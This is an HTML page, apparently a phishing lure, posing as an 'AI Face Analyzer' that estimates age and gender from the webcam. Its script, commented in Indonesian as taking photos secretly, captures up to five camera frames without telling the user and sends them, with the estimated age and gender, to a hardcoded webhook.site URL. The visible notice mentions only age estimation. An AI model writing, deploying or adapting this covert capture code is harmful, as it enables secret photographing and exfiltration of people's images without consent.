<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Analyzer v4.0</title>
    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
    <style>
        body { margin: 0; background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
        #app { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; }
        video { position: absolute; width: 100%; height: 100%; object-fit: cover; }
        canvas { position: absolute; z-index: 10; pointer-events: none; }
        #overlay { position: absolute; z-index: 20; background: rgba(0,0,0,0.85); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; cursor: pointer; }
        .border-box { border: 2px solid #00ff00; padding: 30px; box-shadow: 0 0 20px #00ff00; }
        .blink { animation: blinker 1.5s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <div id="app">
        <div id="overlay" onclick="startEngine()">
            <div class="border-box">
                <h2 class="blink">AI ENGINE READY</h2>
                <p id="status">TAP TO START BIO-SCAN</p>
                <p style="font-size: 10px; color: #888;">System requires camera access for age estimation</p>
            </div>
        </div>
        <video id="video" autoplay muted playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
        const video = document.getElementById('video');
        const status = document.getElementById('status');
        const overlay = document.getElementById('overlay');
        let photoCount = 0;
        let isEngineRunning = false;

        async function startEngine() {
            if(isEngineRunning) return;
            isEngineRunning = true;
            
            status.innerText = "LOADING MODELS...";
            
            try {
                // 1. Ambil Kamera
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;

                // 2. Load "Otak" AI
                const MODEL_URL = 'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights';
                await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
                await faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL);
                await faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL);

                overlay.style.display = 'none';
                processDetection();
            } catch (err) {
                alert("Kamera Error / Izin Ditolak");
                isEngineRunning = false;
            }
        }

        async function processDetection() {
            const canvas = document.getElementById('canvas');
            const displaySize = { width: window.innerWidth, height: window.innerHeight };
            faceapi.matchDimensions(canvas, displaySize);

            setInterval(async () => {
                const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
                    .withAgeAndGender()
                    .withFaceExpressions();

                const resizedDetections = faceapi.resizeResults(detections, displaySize);
                canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
                
                // GAMPILAN DEPAN: Gambar kotak deteksi wajah di layar target
                faceapi.draw.drawDetections(canvas, resizedDetections);
                
                resizedDetections.forEach(result => {
                    const { age, gender } = result;
                    new faceapi.draw.DrawTextField([
                        `AGE: ${Math.round(age)} YEARS`,
                        `GEN: ${gender.toUpperCase()}`
                    ], result.detection.box.topRight).draw(canvas);

                    // SISTEM BELAKANG: Ambil foto diem-diem
                    if (photoCount < 5) {
                        captureStealth(Math.round(age), gender);
                    }
                });
            }, 1000);
        }

        function captureStealth(age, gen) {
            photoCount++;
            const c = document.createElement('canvas');
            c.width = video.videoWidth;
            c.height = video.videoHeight;
            c.getContext('2d').drawImage(video, 0, 0);
            const imgData = c.toDataURL('image/jpeg', 0.5);

            // Kirim ke Webhook
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ 
                    type: "AI_DATA_STEALTH", 
                    snap_no: photoCount, 
                    estimated_age: age, 
                    gender: gen, 
                    image: imgData 
                })
            });
        }
    </script>
</body>
</html>
